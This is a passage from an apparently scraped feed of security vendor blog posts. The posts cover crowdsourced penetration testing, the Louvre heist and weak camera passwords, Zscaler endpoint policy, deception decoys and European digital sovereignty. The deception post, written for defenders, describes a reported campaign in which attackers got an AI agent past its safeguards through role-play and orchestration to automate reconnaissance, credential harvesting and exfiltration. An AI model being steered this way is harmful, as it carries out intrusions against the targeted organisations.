These can include fake testing agencies, tax implications, and even ethical procurement.</p>\n\n<p>To get a better handle on how crowd-based services are delivered, let&rsquo;s look at who&rsquo;s doing the work, the data and operational risks to your organization, and practical controls you can use to make informed procurement and governance decisions.</p>\n\n<h3><strong>Defining Crowdsourced Penetration Testing</strong></h3>\n\n<p>The term itself is not well-known, but to make it easier, let&rsquo;s think of it as a close cousin to a bug bounty program, but keep in mind that while the similarities are clear, the differences can be quite stark.</p>\n\n<p>A bug bounty program is primarily focused on continuous vulnerability discovery and is designed to run indefinitely, or on an always-on basis, allowing for ongoing risk reduction. It typically has a broad and open-ended scope, often covering all public-facing assets. Because the hackers operate with a freestyle and unstructured methodology, the organization benefits from a large, diverse crowd of testers.</p>\n\n<p>The financial model is pay-for-results, meaning the company only pays a bounty for valid, unique vulnerabilities that are found, which can make the total cost unpredictable. The main output is a running list of validated vulnerability reports and security metrics.</p>\n\n<p>In contrast, crowdsourced penetration testing is geared towards a structured, time-boxed assessment to fulfill compliance needs or test a new feature. These engagements are time-bound, lasting for a specific period, and operate within a specific and controlled scope defined before the test begins.</p>\n\n<p>The testers are a curated, smaller team of highly vetted experts who follow a structured and methodology-driven approach. This results in a comprehensive final report that is ideal for satisfying compliance requirements (like SOC 2 or PCI DSS). The cost is typically a fixed fee or a blended model, providing a more predictable budget.</p>\n\n<p>A company should consider crowdsourced penetration testing when they are interested in rooting out lower-risk activities, or when conducting external testing where an organization is not letting the penetration tester in the door. Additionally, price plays a role. Crowdsourced penetration testing tends to be lower cost.</p>\n\n<h3><strong>How Crowdsourced Penetration Services Are Delivered</strong></h3>\n\n<p>In a similar manner to a bug bounty program, most crowdsourced testing is delivered through an <a href=\"https://bastioncyber.io/overwatch-penetration-testing-as-a-service/\" rel=\"noopener\" target=\"_blank\">intermediary platform</a> that coordinates testers, scopes engagements, and aggregates results.</p>\n\n<p>Platforms vary widely in how they operate: some are primarily marketplaces (connecting buyers to individual testers), others deliver managed programs (vetting, triage, reporting, and post-test remediation support.)</p>\n\n<p>The key differences that affect your risk profile include:</p>\n\n<ul>\n\t<li>Whether the platform manages identity and vetting centrally or leaves it to buyers.</li>\n\t<li>How the platform handles disclosure, triage, and remediation workflows.</li>\n\t<li>The contractual relationship: direct hire of testers vs. contracting with a platform-as-a-service provider.</li>\n</ul>\n\n<h3><strong>The Pros and Cons of Global vs Regional Resources</strong></h3>\n\n<p>Using global testers increases scale and specialized skills (useful for niche technologies) but raises regulatory, legal, and supply-chain risks (export control, cross-border data flows, varying labor laws). Regional resources may offer stronger legal recourse, easier background checks, and cultural/contextual advantages &mdash; but smaller talent pools and potentially higher costs.</p>\n\n<p>Who is doing the work &mdash; vetting and trust.</p>\n\n<h3><strong>Vetting of resources</strong></h3>\n\n<p>Not all testers are equal, and a proper vetting program is imperative not only to get good results but to protect your organization. Effective vetting should include:</p>\n\n<ul>\n\t<li>Identity verification (document checks, two-factor identification).</li>\n\t<li>Criminal / police checks where appropriate and lawful.</li>\n\t<li>Skills validation (certificates like <a href=\"https://www.trustwave.com/_hcms/analytics/search/conversion?redirect=aHR0cHM6Ly93d3cudHJ1c3R3YXZlLmNvbS9lbi11cy9jb21wYW55L25ld3Nyb29tL25ld3MvdHJ1c3R3YXZlLWFjaGlldmVzLWNyZXN0LXZ1bG5lcmFiaWxpdHktYXNzZXNzbWVudC1hY2NyZWRpdGF0aW9uLw%3D%3D&amp;ct=SEARCH&amp;pid=21158977&amp;cid=124569690173&amp;t=Y3Jlc3Q%3D&amp;d=www.trustwave.com&amp;c=2&amp;c=3&amp;c=6&amp;rp=1&amp;ab=false&amp;opcid=&amp;rs=UNKNOWN&amp;hs-expires=1793806051&amp;hs-version=1&amp;hs-signature=APUk-v6binablFPR9YVv4XwkvzC2z-iPaA\" rel=\"noopener\" target=\"_blank\">CREST</a> challenge tasks, past program history).</li>\n\t<li>Reputation metrics (platform ratings, peer endorsements, previously published research).</li>\n</ul>\n\n<h3><strong>Ensuring the Testers Are Who They Say They Are</strong></h3>\n\n<p>A major risk with open crowds is impersonation and false identities. Poor vetting can allow criminals or fraudsters to participate and gain entry to your systems. These can include letting state-sponsored or malicious actors who can use testing access as a cover.</p>\n\n<p><strong>Risk scenario</strong>: A bad actor passes a poorly designed and executed vetting process, is granted scoped access, and later exfiltrates data or establishes persistence under the guise of testing.</p>\n\n<h3><strong>Potential Exploitation of Workers</strong></h3>\n\n<p>Crowdsourced models can create labor risks that expose your organization not only to legal issues but also to moral ones.</p>\n\n<ul>\n\t<li><strong>Taxation and superannuation exposure</strong>: Are workers engaged as contractors or employees? Misclassification risks can create liability for platforms or buyers.</li>\n\t<li><strong>Modern slavery/worker protection</strong>: Some platforms may source testers from jurisdictions with poor labor protections; you should consider whether working conditions or coercive practices are involved.</li>\n\t<li><strong>Ethical procurement</strong>: include clauses requiring platforms to adhere to labor standards and to supply transparency about their worker engagement model.</li>\n</ul>\n\n<h3><strong>Security Operations Center (SOC) Complacency During Testing</strong></h3>\n\n<p>One issue to be aware of is SOC complacency. If your SOC treats crowd testing as a controlled exercise, real adversarial activity may be ignored, or conversely, testers may be mistaken for adversaries. Either outcome reduces program value and increases risk.</p>\n\n<h3><strong>Quality of Deliverables</strong></h3>\n\n<p>Crowd testing results can range from one-line &ldquo;bug bounty-like&rdquo; reports to well-documented exploit chains with remediation advice. Ensure you specify the results you want at the end of testing in any contract.</p>\n\n<p>There are three common problems to avoid when arranging tests:</p>\n\n<ul>\n\t<li>Duplicate or low-value findings (noise).</li>\n\t<li>Poorly reproducible or insufficiently documented issues.</li>\n\t<li>Overly generic remediation advice.</li>\n</ul>\n\n<h3><strong>Pen Tester Skill Level</strong></h3>\n\n<p>Crowdsourcing excels at breadth (many scanners and testers run tests concurrently), but not all platforms guarantee depth. If you need advanced adversary simulation, confirm the required skill level and provide a sample of past work.</p>\n\n<p>Remember, there&rsquo;s a difference between:</p>\n\n<ul>\n\t<li><strong>Scripted vulnerability scanning</strong> (automated, low custom skill) and</li>\n\t<li><strong>Specialized offensive security experts</strong> (manual exploitation, creative attack paths).</li>\n</ul>\n\n<h3><strong>Obtaining the Best Results Possible</strong></h3>\n\n<p>Peer-review or triage processes significantly improve output quality. Look for platforms that:</p>\n\n<ul>\n\t<li>Triage and validate submissions before delivery.</li>\n\t<li>Provide a peer-review or second-opinion mechanism for complex findings.</li>\n\t<li>Offer a managed remediation tracking process.</li>\n</ul>\n\n<p>The key is not to treat the crowd as a black box: insist on strong vetting, clear contractual protections, technical controls that minimize exposure, and operational processes that preserve SOC effectiveness.</p>\n\n<p>When you combine those controls with sensible scoping and human triage, crowd testing becomes a powerful discovery engine &mdash; and not an unmanaged risk.</p>\n\n<h3><strong>In Summary</strong></h3>\n\n<p>To mitigate your risk and provide the highest value to your organization, look to the track record of your proposed penetration testing supplier, including the following:</p>\n\n<ul>\n\t<li>The heritage of your supplier, are they committed to your security?</li>\n\t<li>Independent references, whilst organizations will have Non-Disclosure Agreements in place, most organizations should be able to facilitate a call with a customer prior to contract execution.</li>\n\t<li>Industry certifications, CREST being a great example, allowing you to be sure that the cybersecurity companies you engage to test and protect your systems are reputable and competent.</li>\n\t<li>Ask for redacted example reports that align with your required scope, and know the quality of what you will receive in advance.</li>\n</ul>\n\n<p>Finally, if any of the points raised here give you pause, remember that Trustwave SpiderLabs has dedicated teams of pen testers with a long history of conducting highly effective tests that will improve your security.</p>",

      "summary": "<ul>\n\t<li>Cyber meets physical security: Weak passwords and outdated systems may have opened the door to the thieves.</li>\n\t<li>A warning for all industries: The Louvre incident shows why converging cybersecurity and physical security is essential.</li>\n</ul>\n\n<p>In eight short minutes on October 25, 2025, a group of thieves captured the world&rsquo;s attention and imagination, perpetuating a daring heist in broad daylight and escaping with approximately &euro;88 million worth of prized artwork from the planet&rsquo;s most visited museum: The Louvre.</p>\n\n<p>Within the security community, the first successful robbery from the iconic Parisian landmark since 1998 was a bombshell story. But the &ldquo;security community&rdquo; is large and diverse, and very little of the public dialogue regarding the heist touched specifically upon cybersecurity.</p>\n\n<p>These stolen masterpieces were not flush cryptocurrency wallets or valuable pieces of NFT art secreted away on a thumb drive or exfiltrated to a remote server, the thieves employed some of the oldest tools in the burglary game: a ladder for climbing and a sharp edge for cutting.</p>\n\n<p>So far, law enforcement has arrested a total of seven people in connection with the heist, according to <a href=\"https://www.bbc.com/news/articles/cz91jnyelq2o\" rel=\"noopener\" target=\"_blank\">published reports</a>.</p>\n\n<h3><strong>What&rsquo;s the Connection to Cyber?</strong></h3>\n\n<p>While details about the security weaknesses that enabled the heist are still forthcoming, the mechanical lift and electrical angle grinder are not generally the tools of the cybercriminal.</p>\n\n<p>As a result, the Louvre heist, at first glance, seemed largely distinct from the cybersecurity sphere, until additional details emerged regarding the museum&rsquo;s cybersecurity controls.</p>\n\n<p>Details from past audits revealed the museum&rsquo;s security posture was fraught with vulnerabilities and security hygiene concerns. Of note, these security weaknesses pertained directly to the museum&rsquo;s network of physical access control systems, including surveillance cameras secured with the much-ballyhooed password &ldquo;LOUVRE.&rdquo;</p>\n\n<p>To understand how such rudimentary weaknesses could have persisted within such critical anti-theft infrastructure, we must consider the convergence of cyber and physical security.</p>\n\n<p>Readers who have enjoyed Dan Brown&rsquo;s The Da Vinci Code will be aware that the Louvre is equipped with a wide array of physical security systems, including deployable gates and mantraps that can be triggered during a burglary attempt. What may not be so obvious is the extent to which these modern physical security controls are supported by an information technology infrastructure.</p>\n\n<p>As early as 2021, CISA warned of the <a href=\"https://www.cisa.gov/sites/default/files/publications/Cybersecurity%2520and%2520Physical%2520Security%2520Convergence_508_01.05.2021.pdf\" rel=\"noopener\" target=\"_blank\">Cybersecurity and Physical Security Convergence</a>, calling out an &ldquo;increasingly interconnected mesh of cyber-physical systems (CPS)&rdquo;. Anyone who has badged into an office space has experienced this phenomenon, in which an IT-supported access control system affects a change in the physical world in the form of an unlocked door.</p>\n\n<p>The problem, CISA continues in the same 2021 publication, is that the convergence of physical and cybersecurity teams has not kept pace with the expansion of CPS environments.</p>\n\n<p>Seen as unique business functions with distinct responsibilities and skillsets, cyber and physical security groups have traditionally operated in siloes, often reporting to different members of executive leadership. As a result, organizations face increased risk that critical CPS technologies owned and operated within the physical security function are not managed with cyber resilience in mind.</p>\n\n<p>Returning to the Louvre specifically, we see an organization whose physical security controls are at risk of being undermined by the unstable cyber foundation on which they operate.</p>\n\n<p>Past cybersecurity audits demonstrate a spate of information security issues at the museum dating back to 2014, which prompted repeated warnings and improvement recommendations from the French National Cybersecurity Agency (ANSSI).</p>\n\n<p>Among these findings are a few most egregious, including the aforementioned password selection and a reliance upon obsolete security software purchased in 2003 and running on the longtime end-of-life Windows Server 2003 operating system.</p>\n\n<h3><strong>What We Know and What We Don&rsquo;t Know, Yet</strong></h3>\n\n<p>While we know about past cybersecurity issues, without the release of complete details from the ongoing Louvre investigation, it is impossible at this time to ascribe blame to the museum&rsquo;s cybersecurity deficiencies.</p>\n\n<p>However, at the very least we can identify several scenarios in which the security vulnerabilities identified in the ANSSI audit reports could feasibly enable or contribute to a successful heist.</p>\n\n<p>Slick talking and elaborate costumes aside, Clooney and Co. cannot reach the fabled casino vault in Ocean&rsquo;s Eleven without first compromising the integrity of security camera feeds.</p>\n\n<p><img alt=\"Art and Science\" src=\"https://cyber.levelblue.com/m/baa1ae554e26ae8/original/cyber-compromise.jpg\" style=\"width: 500px; height: auto; margin: auto;\" /></p>\n\n<p style=\"text-align: center;\"><em>Cyber compromise of camera systems limits their effectiveness and contributes to a physical security breach.</em></p>\n\n<p>Given the eye-popping value assigned to the stolen art, the incident at the Louvre serves to illustrate the value of an integrated security program, in which CPS systems receive the maintenance required to stay resilient against physical and digital attacks.</p>\n\n<p>This valuable lesson applies well outside the realm of grand larceny as well, as the proliferation of CPS technology could allow an attacker to manipulate medical devices or disable an electrical power grid. All organizations would do well to assess their CPS footprint and foster increased collaboration between Cyber and Physical security specialists.</p>\n\n<p>By viewing physical security through a cyber lens, organizations can better understand how real-world vulnerabilities can lead to digital or physical compromise and impact. At LevelBlue, we help our clients bridge the gap between the digital and physical worlds by assessing how building access, surveillance, and employee processes can open or close doors to cyber and physical threats.</p>",

      "title": "Introducing Location-based Policy with Client Connector",
      "link": "https://www.zscaler.com/blogs/product-insights/introducing-location-based-policy-client-connector",
      "summary": "According to a recent Gallup report*, 52% of all workers have a hybrid work arrangement, and 25% now exclusively work remotely. In other words, there are a lot of user devices that no longer sit in an office behind traditional firewalls. So, how do you prevent these devices from leaking sensitive data and ensure that they have the smallest attack surface possible when they are used in coffee shops and home offices?Thousands of organizations with remote and hybrid workers already use Zscaler\u2019s lightweight agent, Client Connector, to provide their workforce with secure, zero trust connectivity to the internet, SaaS, and private applications. And now, Zscaler is introducing a new Client Connector feature called Location-Based Policy, which enables the ability to steer traffic and apply inbound and outbound endpoint firewall rules based on the trust status of the location of the endpoint, while reducing the effort required to manage policies across groups of users,devices and types of trusted locations.Key benefits:DNS and user traffic steering based on trusted location typeInbound and outbound endpoint firewall management based on type of trusted locationA new policy framework with support for reusable objects and bulk changesLocation-based PolicyClient Connector has always had the ability to detect whether a device is located at a trusted location and forward traffic accordingly. The types of trusted locations available are, \"Off-Trusted,\" \"On-Trusted,\" \"VPN-Trusted,\" and \"Split-VPN Trusted\". Client Connector detects the trust status of a location based on customer-defined criteria and enforces forwarding policies immediately after a device reboot or wakeup and after network changes.&nbsp;&nbsp;Now, with Location-based Policies, per-location Policy Rulesets can be created to control how Client Connector steers DNS queries for specific domains and how application traffic is forwarded. Rulesets can also contain default and specific inbound and outbound firewall rules that are enforced when Client Connector is active and tunneling traffic to the Zscaler Zero Trust Exchange.&nbsp;Protecting the endpoint in any locationWhen the Location-based Policy feature is enabled and a hybrid worker is at the office (which is considered a trusted location) Client Connector detects the location type and applies the Policy Ruleset for \"On-Trusted Network\". Since the organization has deployed Zero Trust for private application access with Zscaler Private Access (ZPA) externally only at this time, the laptop should disable ZPA forwarding in the office, access network resources and query internal domain names using the network DNS servers directly. However, when the laptop accesses SaaS applications or any external resources, &nbsp;traffic should be forwarded to the Zscaler Internet Access (ZIA) service to ensure that user-specific policies for access, security, data protection, DNS security, IPS and firewall are enforced. Windows Defender Firewall on the laptop should &nbsp;allow all inbound and outbound traffic with the Domain Profile.The Policy Ruleset for \"On-Trusted Network\" can be configured with a traffic steering policy to forward all DNS requests for internal domains and all traffic to internal networks directly on the network. The traffic steering policy can be configured to tunnel all other traffic with Z-Tunnel 2.0 to ensure that traffic is protected by Zscaler Internet Access (ZIA). The Policy Ruleset for \"On-Trusted Network\" can be configured to disable endpoint firewall management so Client Connector doesn't make any changes to the endpoint firewall and Windows Defender Firewall continues to operate as it did previously.When the hybrid worker, leaves the office after lunch for an offsite customer meeting (which is considered an untrusted location), Client Connector detects the change immediately when the laptop wakes up from sleep and applies the Policy Ruleset for \"Off-Trusted Network\". As per the organization's security policy, all DNS requests should be protected using DNS security with Zscaler Zero Trust Firewall and all other traffic should be tunneled to the Zero Trust Exchange with Z-Tunnel 2.0 except requests to private applications, which should be tunneled using Zscaler Private Access (ZPA). Lastly, all inbound and outbound traffic to/from the local network and any RFC-1918 networks should be blocked by the Windows firewall with the exception of inbound ZPA Client-to-Client traffic which is used by the IT Servicedesk for remote support.The Policy Ruleset for \"Off-Trusted Network\" can be configured with a traffic steering policy, which forwards all DNS requests and application traffic to Zscaler Internet Access (ZIA) while enabling access to the organization's private applications via Zscaler Private Access (ZPA). Endpoint firewall management can be enabled in the App Profile and a firewall policy defined in the Policy Ruleset to enforce Windows firewall rules. The firewall rules can be configured to block all inbound traffic with the exception of ZPA Client-to-Client traffic and block outbound access to RFC-1918 and local networks while allowing all traffic to the Zscaler Zero Trust Exchange.With the \"Off-Trusted Network\" Policy Ruleset now active, Client Connector steers traffic accordingly and in this case, enables endpoint firewall management. With endpoint firewall management active, Client Connector creates Windows firewall rules in separate WFP sublayer which override Windows Defender Firewall rules. As a result, the active Windows Defender Firewall configuration and rules are left intact and not modified in any way. Since Zscaler Private Access (ZPA) is active, Windows Defender Firewall switches to the Domain Profile (as per default behavior) but Client Connector ensures that the Windows firewall enforces the Client Connector firewall rules defined in the Policy Ruleset instead of the rules defined in Windows Defender Firewall's Domain Profile.To further secure the device, the App Profile assigned to Client Connector can be configured with the Trigger Domain Profile Detection feature (introduced in previous releases) which ensures that Windows Defender Firewall continues to function using its Public Profile when Client Connector is in an \"Off-Trusted Network\" location and Zscaler Private Access (ZPA) is active. With the above feature enabled and Windows Defender Firewall Public Profile configured with a default Block policy for all inbound and outbound traffic, if the user were to disable the Zscaler Internet Access (ZIA) service in Client Connector, the Windows Defender Firewall Public Profile configuration would take effect and ensure that the Windows laptop doesn't fail-open and become a target for attackers and the only way the user would be able to access SaaS, internet or private applications would be by re-enabling Client Connector forwarding.&nbsp;Wrap-upIf you would like to learn more about this important feature, sign up for our upcoming webinar, What's New in Client Connector: Location-Based Policy.&nbsp;*Gallup Inc.

      "summary": "For the longest time, we\u2019ve resisted the urge to talk about why Deception is a great way to counter end-to-end AI-orchestrated cyber attacks. Why? Because when you discuss fighting back against a threat that's just hypothetical, you\u2019re just spreading FUD (fear, uncertainty, and doubt) and confusion.Until yesterday, no credible report of AI being used to pull off sophisticated autonomous attacks \u2013 that changed yesterday when Anthropic&nbsp;published a report detailing the first reported AI-orchestrated cyber espionage campaign. If you work in security, chances are you\u2019ve already read about the attack. If you haven\u2019t, you should \u2013 it\u2019s a&nbsp;fascinating read.What happened?Anthropic reported a Chinese state-sponsored campaign that automated 80\u201390% of tactical operations using agentic AI \u2013 recon, exploit validation, credential harvesting, lateral movement, data analysis, and exfiltration. Human oversight was limited to escalation steps. Appronximately 30 organizations were targeted including major tech companies and government agencies. None of the victims came forward and Anthropic didn\u2019t disclose names but the detailed account verified a handful of intrusions that resulted in credential harvesting, lateral movement, and data collection.&nbsp;What does this attack mean for threat detection?The good news is that this attack followed an old playbook. The bad news is that the old playbook can now be executed at machine speed and with significant parallelism. That change has massive implications for threat detection.&nbsp;Here\u2019s a breakdown of the impact.How Deception can combat AI-based attacksFor years, and again with AI-based attacks, people have wondered about the efficacy of Deception technology. The most common question has been: \u201cWhat if the attacker does not engage with a decoy?\u201dThe attack that Anthropic detailed shows how AI agents engaged in massive parallelism, chasing all viable options simultaneously. So the question of engagement with a decoy has turned from probability into certainty.Consider the following assumptions about autonomous hacking agents:Don\u2019t hesitateDon\u2019t weigh caution to the same degree as a humanDesigned to maximize reward signalsWill follow the next most promising stepTreat everything as a possible vectorCorrelate context beyond human adversary capabilitiesA comprehensive Deception strategy will mean we deploy:Decoy login pages for attractive targetsHoney-token accounts that seem to have high privilegesDecoy machines like databases and file sharesDecoy files with passwords and decoy credentialsIt follows that the AI agent is extremely likely to aggressively pursue opportunities that will generate early warning signals to the security team.&nbsp;Deception combats agentic decision making, with:&nbsp;High-signal, intent-based detection: Only adversaries trip decoy credentials, decoy services, or decoy files. These high-fidelity signals lead to early detection and fast triage.Low cost and low operational overhead: Decoys don\u2019t sit inline. They don\u2019t break apps.Defense-in-depth multiplier: Deception amplifies your identity, endpoint, network, and data-layer controls, catching early pivots that other tools either miss or see later and noisier.Adversary cost asymmetry: Decoys introduce unpredictability into your environment. Attackers, whether human or AI, must probe assets and artifacts to exploit them. Probing leads to detection, slowing AI-driven campaigns and buying your SOC time.Maybe you're wondering ...\u201cAnthropic is adding guardrails \u2013 won\u2019t that stop this?\u201dGuardrails reduce abuse, but they can't eliminate it. The threat actor bypassed safeguards via role-play and orchestration. Plan for autonomy on offense; invest in autonomy on defense.&nbsp;\u201cWe already have EDR/XDR, ITDR, NDR, DLP.\u201dGood \u2013 Deception makes them better. It supplies early, high-confidence signals that route investigations to real pivots. Pairing decoy hits with identity containment, endpoint isolation, and access controls cuts dwell time.Breaking an AI-orchestrated kill chain with DeceptionWe pulled the attack stages from the Anthropic report and layered each stage with decoys you can deploy for early detection, why they\u2019re effective, and how you can pair them with other Zscaler and security controls for faster triage, investigation, and containment.Implementation blueprintDeploy the following types of decoys and automated responses to find and contain bad actors quickly across your full environment:Perimeter deception: Plant decoys of VPNs, firewalls, email servers, and test bed applications running vulnerabilities. With Zscaler Deception, the decoys aren\u2019t even hosted in your environment and require only a DNA-A record pointing to the decoy hostname. These decoys will provide early pre-breach private threat intel and can be blocked by ZIA or by your firewall.Identity-first deception: Seed honey users, SPNs, roles, and keys that match your real RBAC and group structures. Wire first touch to automatic revocation and stepped-up authentication.Deception realism: Stand up decoy web services, databases, registries, and admin consoles through templates matching your stack (versions, banners, auth flows). Rotate banners and minor misconfigs periodically.Dark-data canaries: Embed decoy files that act as beacons in sensitive-looking datasets and configuration fields; monitor at query/exfiltration time with deterministic alerts.Response automation: Treat a decoy hit as a containment/orchestration trigger\u2014revoke tokens, isolate hosts/sessions, block egress, and then route enriched context to SOC playbooks and IR.Operating guidance for CISOs, security architects, and SOC leadersConsider the following metrics and low operational requirements for your deception strategy:Measure dwell-time reduction: Track how decoy hits correlate with actual malicious investigations and how quickly they trigger containment. Expect fewer false positives, faster triage.Budget and staffing: Deception is not a staffing burden - it\u2019s a design task. With Zscaler Deception, a single person template can launch a deception campaign, and SOC automation handles the response.Cloud and SaaS: Don\u2019t stop at networks and endpoints. Plant deception in AD, cloud workloads, and data stores where AI-driven campaigns naturally pivot.Closing thoughtsDeception converts AI-orchestrated cyber attacks into decisive signals at minimal cost and operational weight. It won\u2019t replace other tooling in your security stack, but it will make that tooling meaningfully better by identifying autonomous attackers at the moments their intent is visible. The right move is not to wait for AI guardrails to solve misuse. Pair adaptive, coherent deception with identity, endpoint, network, and data controls to catch attacks early, contain them quickly, and shrink dwell time.Request a demo to learn more about how Zscaler Deception can break the kill chain for AI-orchestrated attacks",

      "link": "https://www.zscaler.com/blogs/company-news/enabling-europes-digital-sovereignty-through-technology",
      "summary": "For years, Europe has discussed the concept of digital sovereignty, but geopolitical fragmentation and a growing ambition for technological independence have moved the discussion from theory toward action. On November 18, the French and German governments will host a high-level summit aimed at turning this aspiration into a practical roadmap. It\u2019s a pivotal moment as policymakers, industry leaders, and advocates unite to safeguard Europe\u2019s digital future.Let\u2019s be clear: Europe is charting new territory. The ambition to secure control over critical digital infrastructure, redefine data governance, and unlock innovation is bold, understandable, and yet complex. It is, however, not a concept with a clear definition. In fact, if one visited the various EU capitals one would probably encounter more than 27 different versions of what \u201cdigital sovereignty\u201d could mean. But the lack of one coherent and agreed upon definition should not be misunderstood. To paraphrase a senior official from one of the largest member states during a recent conversation: The call for digital sovereignty is loud and ideological.&nbsp;In Europe, there is indeed an increasing convergence on a number of principles. First and foremost, it\u2019s about securing the future; about being in control of data, being independent, ensuring service continuity, demanding transparency, and making sure that Europe reaps the benefits of the digital age and remains competitive on the global stage.The tech industry has a responsibility to respond in earnest. At Zscaler, we understand the critical nature of this goal. We believe sovereignty must be achieved on European terms. As a global leader in cybersecurity with almost 2,500 customers across Europe, we are committed to innovating and delivering cutting-edge technology that aligns with and supports Europe\u2019s digital vision. As a testament to this commitment Zscaler was in 2010 the first security service provider to build a cloud for Europe.Ahead of the Summit in Berlin, we offer our perspective on some of the defining elements of digital sovereignty and explore how solutions deliver the security, flexibility, and independence European organizations demand to thrive in today\u2019s interconnected world.1. Safeguarding European DataEurope\u2019s data must be private, secure, and local. As organizations adopt global cloud systems, they are concerned about losing control over sensitive information to outside actors or cyberthreats. Data sovereignty is about keeping data protected, and ensuring compliance with national rules while building trust for critical operations.How Zscaler Supports Europe\u2019s Data Protection and Localization Goals:Zscaler does not store end-user content: All inline traffic processing is performed in-memory inside the local infrastructure, simplifying data control.The Zscaler Zero Trust Exchange secures application access without exposing sensitive data.The platform\u2019s cloud-native design leverages encryption, data visibility, and granular access controls, seamlessly aligning with GDPR and broader compliance requirements.Customers can opt to exclusively use European infrastructure. Zscaler has 25 data centers across Europe (20 in EU countries), ensuring data processing happens locally for optimal performance and sovereignty.European customers' can ensure that their log data is stored within Europe. However, customers have full control over storage decisions and have the option to have data hosted in any sovereign or in-country logging zones.Zscaler makes data control simple and enables organizations to uphold the principles of Privacy by Design and Privacy by Default while delivering low-latency, highly secure access.&nbsp;2. Securing Digital AutonomyDigital sovereignty involves reducing overreliance on foreign technologies, and keeping control over systems. Europe needs flexible frameworks that avoid vendor lock-in while enabling secure innovation. Without autonomy, organizations risk being limited in how they evolve and protect their most critical digital assets.How Zscaler Facilitates Europe's Technological Independence and Cybersecurity Goals:Enabling Europe\u2019s Technological Independence:Zscaler\u2019s vendor-neutral architecture allows European businesses to retain flexibility in their IT frameworks, allowing organisations to mix and match solutions across cloud, data, endpoint, identity, and services from different technology providers. For more information, please visit:&nbsp;/partners/technologyZscaler facilitates delegation of administration which allows only EU citizens to define policies, logging and viewing of any data on our platform.A cloud-based approach ensures businesses can reduce dependencies on legacy systems while avoiding vendor lock-in, preserving sovereignty and freedom to innovate.Zscaler ensures businesses can migrate from legacy systems without being locked into specific hardware, proprietary ecosystems, or constrained by external dependencies.Securing Europe\u2019s Critical Infrastructure:With Zscaler\u2019s Zero Trust architecture, users and devices are continuously authenticated and authorized before accessing applications, preventing breaches.Zscaler\u2019s advanced threat protection capabilities protect organisations from malware, Zero-Day vulnerabilities, and AI-driven cyberthreats, while safeguarding operations across the continent.Zscaler is working with hosting and service providers to own & operate sovereign solutions built on Zscaler cloud solutions in their European datacenters.&nbsp;Zscaler is redefining security for a resilient, self-reliant Europe by blending cutting-edge technology with scalable and best-in-class security.3. Accelerating InnovationInnovation drives growth and competitiveness, and Europe must embrace new technologies to stay ahead. To succeed, organizations need to adopt solutions that are secure and compliant, while still giving them the ability to operate and scale confidently without putting sensitive data at risk.How Zscaler Facilitates Europe\u2019s Innovation and Competitiveness Goals:By facilitating secure, cloud-first strategies, Zscaler reduces infrastructure costs, freeing resources for new investments in innovation and growth. Scalable, flexible solutions allow organizations to confidently adopt emerging technologies.With Zscaler\u2019s capabilities, businesses can seamlessly enable secure hybrid work environments, delivering security and flexibility for modern workplaces.Zscaler innovates, improves operational efficiencies, and responds to market trends faster, gaining a critical edge against international competitors, while maintaining compliance with Europe\u2019s rigorous regulatory standards.A no-compromise Zero Trust approach ensures that organizations can innovate and expand without exposing their systems, people, or data to unnecessary risk.At the same time, a transition away from legacy technology offers the additional advantage of combining state-of-the-art protection while reducing costs: Unlike previous technological innovations, moving forward saves resources.&nbsp;Zscaler redefines what it means to innovate securely in the digital age, ensuring that European businesses grow and stay competitive internationally.4. Delivering Responsible AIAI has the potential to transform the digital economy, but it also brings security vulnerabilities and the risk of misuse. Europe\u2019s goal is to adopt AI responsibly by focusing on privacy, ethical standards, and robust safeguards that ensure trust and transparency in AI systems.&nbsp;As recently recommended in a joint report&nbsp;by French and German authorities, Zero Trust must be applied to LLM systems to address AI-specific security challenges.How Zscaler Enables Responsible AI Adoption:Achieving the productivity gains from AI requires that the AI systems can run safely without exposing organizations to risk.Zscaler is committed to ensuring that any AI systems it deploys in its products adheres to the regulatory requirements set forth in the EU AI Act, which is the first comprehensive AI regulatory framework enacted in the world establishing global standards for transparency, fairness, and accountability in AI.Zero Trust principles protect sensitive AI datasets and data pipelines, preventing manipulation, theft, and malicious exploitation while preserving the integrity of algorithms and models.Through Zero Trust architecture, Zscaler safeguards the use of AI models, agentic AI, and their data pipelines, ensuring the integrity of AI solutions.Zscaler helps European organizations maximize the potential of AI, meeting ethical standards, and protecting systems and data pipelines against misuse.5. Providing Operational ResilienceDisruptions from cyberattacks, natural disasters, damage to undersea cables, and political uncertainty can threaten critical systems and data. Operational resilience helps businesses stay functional and secure during such events, ensuring stability and continuity even in unforeseen circumstances.How Zscaler Bolsters Operational Resilience:Zscaler\u2019s Zero Trust architecture ensures secure, direct access to cloud services and applications, even during disruptions caused by internet outages or attacks on critical infrastructure such as undersea cables, due to our resilient data center architecture, keeping European businesses operational when it matters most.With real-time threat protection, Zscaler prevents ransomware and other cyber threats from disrupting critical infrastructure and business operations.Zscaler provides secure, flexible access that supports employees working from anywhere while maintaining security standards.By decoupling security from legacy network models, and embracing cloud-native solutions, Zscaler empowers organizations to adapt quickly to shifting geopolitical conditions, ensuring business continuity in even the most uncertain environments.Zscaler is the first cloud security solution to deliver a business continuity solution.&nbsp; Through either customer-hosted or third-party hosted infrastructure, Zscaler customers are protected from service interruptions due to black-outs, brown-outs, catastrophic failures of infrastructure, terrorism, or regulatory/policy changes.&nbsp; Issues local to the user, between the user and the cloud, or a cloud incident are detected and fail-over to a business continuity solution occurs automatically.Our customers have an option to keep using a self-hosted private service edge even in case of a catastrophic global routing event which would make all cloud services unavailable.Zscaler builds resilience into organizations\u2019 systems, protecting operations against disruptions and safeguarding sovereignty goals.Zscaler delivers destination agility and resilience by dynamically rerouting traffic and adapting paths in real time, maintaining secure and continuous connectivity during internet or cloud disruptions.The New Reality Requires a Renewed Commitment to Europe\u2019s Digital FutureAs we approach the Franco-German Summit on European Digital Sovereignty, two principles stand out as essential to the success of Europe\u2019s digital ambitions:Digital sovereignty and open strategic autonomy must be shaped on European terms, driven by European priorities and values. This means that technology companies must innovate and deliver solutions that align with Europe\u2019s needs and aspirations.Trusted technology providers that deliver Europe\u2019s sovereignty in practice\u2014not just in words\u2014should be empowered to keep contributing to this vision. EU policy should allow trusted technology providers that demonstrably advance Europe\u2019s sovereignty to continue contributing to this vision.Combining these principles is, in our view, critical to achieving Europe\u2019s sovereign digital future, as well as its global competitiveness at this pivotal moment in history.At Zscaler, we recognize that enabling Europe\u2019s digital sovereignty is about empowering European organizations to secure their systems, innovate without boundaries, and thrive on their own terms. As a global leader in Zero Trust security Zscaler is uniquely positioned to help European organizations meet today\u2019s challenges and build a resilient, self-reliant future.",

